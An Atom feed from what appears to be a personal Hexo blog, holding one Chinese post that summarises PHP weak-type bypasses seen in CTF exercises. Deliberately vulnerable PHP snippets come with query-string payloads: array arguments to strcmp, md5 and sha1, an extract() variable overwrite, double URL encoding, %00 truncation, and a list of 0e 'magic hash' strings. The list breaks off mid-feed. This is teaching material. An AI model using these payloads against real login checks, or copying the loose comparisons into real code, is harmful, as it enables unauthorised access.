<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Atkx&#39; blog</title>
  
  
  <link href="https://swhat.github.io/atom.xml" rel="self"/>
  
  <link href="https://swhat.github.io/"/>
  <updated>2021-02-03T07:58:14.733Z</updated>
  <id>https://swhat.github.io/</id>
  
  <author>
    <name>Atkx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>代码审计之弱类型绕过</title>
    <link href="https://swhat.github.io/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/"/>
    <id>https://swhat.github.io/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/</id>
    <published>2020-11-04T07:48:04.000Z</published>
    <updated>2021-02-03T07:58:14.733Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：PHP弱类型绕过方法</p> <a id="more"></a>        <h2 id="前言"   >          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h2>      <blockquote><p>之前做过没有总结，这几天做题经常遇见弱类型绕过，写篇博客总结一下(水一篇)，嘻嘻。</p></blockquote><p>提到php代码绕过，必然会提起<code>比较操作符</code>,下面来谈一谈比较操作符<code>==</code>与<code>===</code>，这两种都可以比较两个数字的大小，但是有很明显的区别。</p><div class="table-container"><table><thead><tr><th>操作符</th><th>描述</th></tr></thead><tbody><tr><td>==</td><td>把两端变量类型转换成相同的，再进行比较</td></tr><tr><td>===</td><td>先判断两端变量类型是否相同，再进行比较</td></tr></tbody></table></div><p><strong>注意</strong>：在两个相等的符号中，一个字符串与一个数字相比较时，字符串会转换成数值。</p>        <h2 id="1-extract变量覆盖"   >          <a href="#1-extract变量覆盖" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-extract变量覆盖" class="headerlink" title="1.extract变量覆盖"></a>1.extract变量覆盖</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shiyan</span>)) &#123;</span><br><span class="line"><span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;flag&#123;xxx&#125;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;Oh.no&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><div class="table-container"><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>extract()</td><td>函数从数组中将变量导入到当前的符号表</td></tr><tr><td>在第三行, 运用了extract()函数, 将GET方式获得的变量导入到当前的符号表中,然后判断$ flag和$ shiyan两个变量的内容是否相等。</td><td></td></tr></tbody></table></div><p>extract()函数导致这段代码存在一个变量覆盖漏洞,构造Payload</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?flag=&amp;shiyan=</span><br></pre></td></tr></table></div></figure><p> $ flag和$ shiyan这两个变量的内容都会被设置成空字符串。这样,就满足$shiyan == $content的条件，输出flag。<br><img   src="https://img-blog.csdnimg.cn/20200425110348780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="2-strcmp比较字符串"   >          <a href="#2-strcmp比较字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-strcmp比较字符串" class="headerlink" title="2.strcmp比较字符串"></a>2.strcmp比较字符串</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;xxxxx&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>], <span class="variable">$flag</span>) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span></span><br><span class="line"><span class="comment">//比较两个字符串（区分大小写）</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>); </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;No&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><div class="table-container"><table><thead><tr><th>函数</th><th>用法</th><th>返回值</th></tr></thead><tbody><tr><td>strcmp()</td><td>strcmp(string1,string2)</td><td>若返回0,代表两个字符串相等 ；若返回&lt;0 ,代表string1 小于 string2；若返回&gt;0，代表string1 大于 string2</td></tr></tbody></table></div><p>对于传入非字符串类型的数据的时候，strcmp函数会报错，将return 0 ，但却判定其相等了。<br> 所以，strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制。</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?a[]=<span class="number">123</span> </span><br></pre></td></tr></table></div></figure><p> <img   src="https://img-blog.csdnimg.cn/20200425113316110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="3-urldecode二次编码绕过"   >          <a href="#3-urldecode二次编码绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-urldecode二次编码绕过" class="headerlink" title="3.urldecode二次编码绕过"></a>3.urldecode二次编码绕过</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">&quot;hackerDJ&quot;</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;hackerDJ&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Access granted!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><div class="table-container"><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>urldecode()</td><td>解码已编码的 URL 字符串</td></tr></tbody></table></div><p>使用GET传参时，浏览器就已经把hakerDJ进行了一次解码了，然后又用了urldecode函数又再次进行了一次解码。所以我们要将hakerDJ进行二次编码</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">42</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">41</span></span><br></pre></td></tr></table></div></figure><p><img   src="https://img-blog.csdnimg.cn/20201031180041123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="4-md5-函数"   >          <a href="#4-md5-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-md5-函数" class="headerlink" title="4.md5()函数"></a>4.md5()函数</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;test&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;Your password can not be your username.&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>md5()</td><td>函数计算字符串的 MD5 散列</td></tr><tr><td>==</td><td>只需要等号两边的值是否相等。比如‘1’==1就成立，返回true</td></tr><tr><td>===</td><td>需要全等号两边的值和类型全都相等才成立</td></tr></tbody></table></div><p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?username[]=<span class="number">1</span>&amp;password[]=<span class="number">2</span></span><br></pre></td></tr></table></div></figure><p><img   src="https://img-blog.csdnimg.cn/20200425115133708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="5-数组返回NULL绕过"   >          <a href="#5-数组返回NULL绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-数组返回NULL绕过" class="headerlink" title="5.数组返回NULL绕过"></a>5.数组返回NULL绕过</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;You password must be alphanumeric&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;--&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . <span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><div class="table-container"><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>ereg</td><td>函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回true，否则返回false</td></tr><tr><td>strpos</td><td>函数查找字符串在另一字符串中第一次出现的位置。</td></tr></tbody></table></div><p>第4行代码，ereg函数会对传入的password从<code>a-z,A-Z,0-9</code> 进行匹配，将你的密码限制在这三种字符中。</p><p><strong>方法一</strong>：<br><code>strpos()</code>需要匹配到<code>--</code>才能输出flag，所以我们需要绕过<code>strpos()</code>函数。<code>strpos()</code>如果传入数组，会返回NULL。</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password[]=<span class="number">1</span></span><br></pre></td></tr></table></div></figure><p><img   src="https://img-blog.csdnimg.cn/20201031185451492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p><p><strong>方法二</strong>：</p><p>搜索字母的字符是大小写敏感的, 我们可以用%00来截断，在%00之后的数值函数无法识别</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password=<span class="number">1</span>%<span class="number">00</span>--</span><br></pre></td></tr></table></div></figure><p><img   src="https://img-blog.csdnimg.cn/20201031185650537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="6-弱类型整数大小比较绕过"   >          <a href="#6-弱类型整数大小比较绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-弱类型整数大小比较绕过" class="headerlink" title="6. 弱类型整数大小比较绕过"></a>6. 弱类型整数大小比较绕过</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">is_numeric(<span class="variable">$temp</span>)?<span class="keyword">die</span>(<span class="string">&quot;no numeric&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$temp</span>&gt;<span class="number">1336</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></div></figure><div class="table-container"><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>is_numeric()</td><td>判断变量是否为数字或数字字符串</td></tr></tbody></table></div><p>传入的值会被is_numeric函数进行检测，如果为数字就直接输出no numeric，传参<code>password=2000a</code>既不是一个数字又大于1336,返回NULL，可以绕过。</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password=<span class="number">2000</span>a</span><br></pre></td></tr></table></div></figure><p><img   src="https://img-blog.csdnimg.cn/20201031192339220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="7-sha-函数比较绕过"   >          <a href="#7-sha-函数比较绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-sha-函数比较绕过" class="headerlink" title="7. sha()函数比较绕过"></a>7. sha()函数比较绕过</h2>      <p><span class="exturl"><a class="exturl__link"   href="http://123.206.87.240:9009/7.php" >http://123.206.87.240:9009/7.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">var_dump(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;  &quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your password can not be your name!&#x27;</span>; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>); <span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Invalid password.&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Login first!&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><div class="table-container"><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td>sha1()函数无法处理数组类型，通过构造数组，将报错并返回false，使条件成立，这样就绕过了sha1()函数，获得flag</td><td></td></tr></tbody></table></div><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?name[]=<span class="number">1</span>&amp;password[]=<span class="number">2</span></span><br></pre></td></tr></table></div></figure><p><img   src="https://img-blog.csdnimg.cn/20201031215444337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="8-md5加密相等绕过"   >          <a href="#8-md5加密相等绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-md5加密相等绕过" class="headerlink" title="8. md5加密相等绕过"></a>8. md5加密相等绕过</h2>      <p><span class="exturl"><a class="exturl__link"   href="http://123.206.87.240:9009/13.php" >http://123.206.87.240:9009/13.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$md51 = md5(&#x27;QNKCDZO&#x27;);</span><br><span class="line">$a = @$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(isset($a)) &#123;</span><br><span class="line">if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">echo <span class="string">&quot;flag&#123;*&#125;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">echo <span class="string">&quot;false!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">echo <span class="string">&quot;please input a&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure><p>字符串QNKCDZO被md5加密后之后是前两位为<code>0e</code>，然后我们找一个字符串的md5之后的结果也为e0xxx的就可以绕过。</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?a=s878926199a</span><br></pre></td></tr></table></div></figure><p><img   src="https://img-blog.csdnimg.cn/20201103191138163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p><p>原理：</p><blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，</p><p>所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p></blockquote><p>以下字符串，md5哈希值都是0e开头的：</p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span 